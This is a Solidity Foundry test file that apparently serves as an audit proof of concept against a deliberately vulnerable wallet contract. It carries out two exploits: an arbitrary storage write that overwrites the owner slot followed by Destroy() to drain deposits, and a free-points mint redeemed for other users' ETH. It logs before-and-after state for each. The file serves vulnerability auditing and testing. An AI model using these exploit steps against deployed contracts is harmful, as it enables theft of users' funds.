// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/arbitrary_location_write_simple.sol";

/// @title Wallet arbitrary-storage-write / access-control PoC
/// @notice The previous revision reverted because `PopBonusCode()` finally calls
///         `bonusCodes.pop()`. Since Solidity 0.6 (and therefore 0.8.26),
///         `.pop()` on an empty array reverts with Panic(0x31) *even inside an
///         `unchecked` block* - the bounds check is a compiler-inserted panic,
///         not an arithmetic overflow check. So the historical array-length
///         underflow can no longer be triggered from user code.
///
///         The dangerous primitive the audit is about still exists, however:
///         `UpdateBonusCodeAt()` writes to `bonusCodes[idx]` with only a
///         `require(idx < bonusCodes.length)` guard. If the length is corrupted
///         to a huge value, this becomes an *arbitrary storage write* that lets
///         an attacker overwrite `owner` and then call `Destroy()` to take the
///         wallet's funds (exactly the Parity-style "become owner & destroy"
///         access-control scenario). We set up that corrupted length directly
///         and then exercise the real write / takeover / drain path.
contract WalletAccessControlTest is Test {
    Wallet internal wallet;

    address internal owner = address(0xA11CE);
    address internal attacker = address(0xB0B);
    address internal victim = address(0xCAFE);

    function setUp() public {
        vm.prank(owner);
        wallet = new Wallet();
    }

    /// Access-control takeover + fund drain via the unchecked arbitrary write.
    function test_ArbitraryWrite_OwnerTakeover_And_Destroy() public {
        // Victim funds the wallet so there is something to steal.
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        (bool ok, ) = address(wallet).call{value: 10 ether}("");
        require(ok, "deposit failed");
        assertEq(address(wallet).balance, 10 ether, "wallet should hold 10 ETH");

        // Storage layout:
        //   slot 0 -> bonusCodes.length
        //   slot 1 -> owner
        //   dynamic-array element i of bonusCodes lives at
        //   keccak256(abi.encode(uint256(0))) + i
        uint256 base = uint256(keccak256(abi.encode(uint256(0))));
        uint256 ownerSlot = 1;

        // Index that makes keccak256(0) + idx wrap around to slot 1 (owner).
        uint256 idx;
        unchecked {
            idx = ownerSlot - base;
        }

        // Reproduce the corrupted (huge) length the broken pop-underflow used
        // to create, so the bounds check in UpdateBonusCodeAt() passes.
        vm.store(address(wallet), bytes32(uint256(0)), bytes32(type(uint256).max));

        // Arbitrary storage write: overwrite `owner` with the attacker.
        vm.prank(attacker);
        wallet.UpdateBonusCodeAt(idx, uint256(uint160(attacker)));

        assertEq(
            uint256(vm.load(address(wallet), bytes32(ownerSlot))),
            uint256(uint160(attacker)),
            "owner not overwritten"
        );

        // Attacker is now the owner and drains the wallet.
        uint256 balBefore = attacker.balance;
        vm.prank(attacker);
        wallet.Destroy();

        assertEq(address(wallet).balance, 0, "wallet not drained");
        assertEq(attacker.balance - balBefore, 10 ether, "attacker did not receive funds");
    }

    /// Genuine, cheat-code-free fund loss that exists in 0.8.26:
    /// `PushBonusCode()` mints 10 points for *free* (no ETH required) and points
    /// are redeemable for ETH via `withdrawPoints()` at 100 points / wei, so any
    /// user can extract ETH that other users deposited.
    function test_FreePointsDrain() public {
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        (bool ok, ) = address(wallet).call{value: 1 ether}("");
        require(ok, "deposit failed");

        uint256 startBal = attacker.balance;

        vm.startPrank(attacker);
        for (uint256 i = 0; i < 300; i++) {
            wallet.PushBonusCode(i); // +10 free points each => 3_000 points
        }
        wallet.withdrawPoints(3_000); // redeem for ETH the attacker never deposited
        vm.stopPrank();

        assertGt(attacker.balance, startBal, "attacker got ETH without depositing");
    }

    /// @notice Differential validation added by the audit request.
    ///         It snapshots the relevant state before and after:
    ///         1) arbitrary storage write -> overwrite owner -> Destroy drain
    ///         2) PushBonusCode -> free points -> withdrawPoints ETH drain
    ///         and prints exactly one final verdict line.
    function test_Z_DifferentialValidation() public {
        bool exploit1;
        {
            console.log("========== Scenario 1: arbitrary write -> owner takeover -> Destroy ==========");

            // Victim funds the wallet so there is something to steal.
            vm.deal(victim, 10 ether);
            vm.prank(victim);
            (bool ok, ) = address(wallet).call{value: 10 ether}("");
            require(ok, "deposit failed");

            uint256 base = uint256(keccak256(abi.encode(uint256(0))));
            uint256 ownerSlot = 1;
            uint256 idx;
            unchecked {
                idx = ownerSlot - base;
            }

            // Setup, not the attacker action: reproduce corrupted array length.
            vm.store(address(wallet), bytes32(uint256(0)), bytes32(type(uint256).max));

            // BEFORE state snapshot.
            bytes32 ownerSlotBefore = vm.load(address(wallet), bytes32(ownerSlot));
            uint256 walletBalBefore = address(wallet).balance;
            uint256 attackerBalBefore = attacker.balance;

            console.log("--- BEFORE: state snapshot (arbitrary write) ---");
            console.log("ownerSlotBefore:", uint256(ownerSlotBefore));
            console.log("walletBalanceBefore:", walletBalBefore);
            console.log("attackerBalanceBefore:", attackerBalBefore);

            // TRIGGER 1: arbitrary storage write overwrites owner.
            console.log("--- TRIGGER: UpdateBonusCodeAt(idx, attacker) ---");
            console.log("idx:", idx);
            vm.prank(attacker);
            wallet.UpdateBonusCodeAt(idx, uint256(uint160(attacker)));

            // AFTER state snapshot (write).
            bytes32 ownerSlotAfterWrite = vm.load(address(wallet), bytes32(ownerSlot));
            bool ownerOverwritten =
                uint256(ownerSlotAfterWrite) == uint256(uint160(attacker)) &&
                ownerSlotAfterWrite != ownerSlotBefore;

            console.log("--- AFTER: state snapshot (arbitrary write) ---");
            console.log("ownerSlotAfterWrite:", uint256(ownerSlotAfterWrite));
            console.log("ownerOverwritten:", ownerOverwritten);

            // TRIGGER 2: attacker is now owner and drains funds.
            console.log("--- TRIGGER: Destroy() as new owner ---");
            vm.prank(attacker);
            wallet.Destroy();

            // AFTER state snapshot (destroy).
            uint256 walletBalAfterDestroy = address(wallet).balance;
            uint256 attackerBalAfterDestroy = attacker.balance;
            uint256 attackerGain = attackerBalAfterDestroy > attackerBalBefore
                ? attackerBalAfterDestroy - attackerBalBefore
                : 0;

            bool walletDrained = walletBalAfterDestroy == 0 && attackerGain == 10 ether;

            console.log("--- AFTER: state snapshot (Destroy) ---");
            console.log("walletBalanceAfterDestroy:", walletBalAfterDestroy);
            console.log("attackerBalanceAfterDestroy:", attackerBalAfterDestroy);
            console.log("attackerGain:", attackerGain);
            console.log("walletDrained:", walletDrained);

            exploit1 = ownerOverwritten && walletDrained;
            console.log("--- COMPARISON: arbitrary write / Destroy ---");
            console.log("scenario1Exploited:", exploit1);
        }

        bool exploit2;
        {
            console.log("========== Scenario 2: free points -> withdrawPoints ETH drain ==========");

            Wallet wallet2;
            vm.prank(owner);
            wallet2 = new Wallet();

            vm.deal(victim, 1 ether);
            vm.prank(victim);
            (bool ok2, ) = address(wallet2).call{value: 1 ether}("");
            require(ok2, "deposit2 failed");

            // BEFORE state snapshot.
            uint256 pointsBefore = wallet2.userPoints(attacker);
            uint256 wallet2BalBefore = address(wallet2).balance;
            uint256 attackerBalBefore2 = attacker.balance;

            console.log("--- BEFORE: state snapshot (free points) ---");
            console.log("userPoints(attacker) before:", pointsBefore);
            console.log("wallet2BalanceBefore:", wallet2BalBefore);
            console.log("attackerBalanceBefore2:", attackerBalBefore2);

            // TRIGGER 1: mint 300 * 10 free points.
            console.log("--- TRIGGER: 300 x PushBonusCode ---");
            vm.startPrank(attacker);
            for (uint256 i = 0; i < 300; i++) {
                wallet2.PushBonusCode(i);
            }
            vm.stopPrank();

            // AFTER state snapshot (push).
            uint256 pointsAfterPush = wallet2.userPoints(attacker);
            bool pointsMinted = pointsAfterPush == pointsBefore + 3_000;

            console.log("--- AFTER: state snapshot (PushBonusCode) ---");
            console.log("userPoints(attacker) after push:", pointsAfterPush);
            console.log("pointsMinted:", pointsMinted);

            // TRIGGER 2: redeem points for ETH that the attacker never deposited.
            console.log("--- TRIGGER: withdrawPoints(3000) ---");
            vm.prank(attacker);
            wallet2.withdrawPoints(3_000);

            // AFTER state snapshot (withdraw).
            uint256 pointsAfterWithdraw = wallet2.userPoints(attacker);
            uint256 wallet2BalAfter = address(wallet2).balance;
            uint256 attackerBalAfter2 = attacker.balance;
            uint256 attackerGain2 = attackerBalAfter2 > attackerBalBefore2
                ? attackerBalAfter2 - attackerBalBefore2
                : 0;

            bool pointsBurned = pointsAfterWithdraw == pointsBefore;
            bool ethDrainedFree = wallet2BalAfter < wallet2BalBefore && attackerGain2 > 0;

            console.log("--- AFTER: state snapshot (withdrawPoints) ---");
            console.log("userPoints(attacker) after withdraw:", pointsAfterWithdraw);
            console.log("wallet2BalanceAfter:", wallet2BalAfter);
            console.log("attackerBalanceAfter2:", attackerBalAfter2);
            console.log("attackerGain2:", attackerGain2);
            console.log("pointsBurned:", pointsBurned);
            console.log("ethDrainedFree:", ethDrainedFree);

            exploit2 = pointsMinted && pointsBurned && ethDrainedFree;
            console.log("--- COMPARISON: free points / withdrawPoints ---");
            console.log("scenario2Exploited:", exploit2);
        }

        bool vulnerabilityExists = exploit1 || exploit2;
        console.log("========== FINAL DIFFERENTIAL VERDICT ==========");

        if (vulnerabilityExists) {
            console.log(
                "Vulnerability Exists: before/after state changed - owner slot overwritten and/or free points redeemed for ETH"
            );
        } else {
            console.log(
                "Vulnerability not Exist: before/after state did not change as expected"
            );
        }
    }
}